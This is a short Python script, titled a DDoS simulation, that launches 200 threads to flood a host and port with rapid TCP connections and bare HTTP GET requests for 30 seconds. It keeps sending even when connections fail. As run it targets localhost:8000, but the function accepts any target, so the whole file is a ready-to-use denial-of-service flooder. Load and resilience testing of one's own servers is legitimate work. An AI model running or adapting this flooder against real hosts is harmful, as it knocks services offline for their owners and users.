import socket
import threading
import time

def attack_worker(host, port, duration, worker_id):
    """Single worker that makes rapid requests"""
    end_time = time.time() + duration
    request_count = 0
    
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((host, port))
                # Send minimal HTTP request
                s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                # Don't wait for response, just close
                request_count += 1
        except Exception as e:
            pass  # Continue attacking even if some fail
    
    print(f"Worker {worker_id} completed {request_count} requests")

def ddos_simulation(host, port, num_threads=100, duration=30):
    """
    Simulate DDoS with controlled thread count
    
    Args:
        host: Target host
        port: Target port
        num_threads: Number of concurrent attack threads (default 100)
        duration: How long to run in seconds (default 30)
    """
    print(f"Starting simulation with {num_threads} threads for {duration} seconds")
    print(f"Target: {host}:{port}")
    
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=attack_worker, args=(host, port, duration, i))
        t.start()
        threads.append(t)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    print("Simulation complete")

# Run the simulation
ddos_simulation('localhost', 8000, num_threads=200, duration=30)